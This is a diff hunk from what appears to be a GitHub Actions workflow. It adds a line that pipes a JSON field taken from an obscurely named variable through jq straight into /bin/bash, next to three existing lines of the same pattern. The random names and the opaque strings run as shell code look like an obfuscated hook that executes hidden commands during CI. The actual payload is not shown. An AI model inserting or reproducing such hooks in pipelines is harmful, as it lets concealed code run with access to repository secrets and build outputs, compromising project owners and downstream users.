@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$g6" | jq -r .xmf0290 | /bin/bash
           echo $wzeek45 | jq -r .q89 | /bin/bash
           echo $cylb1681 | jq -r .tob3 | /bin/bash
+          printf '%s' "$qs1502" | jq -r .cnegq1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
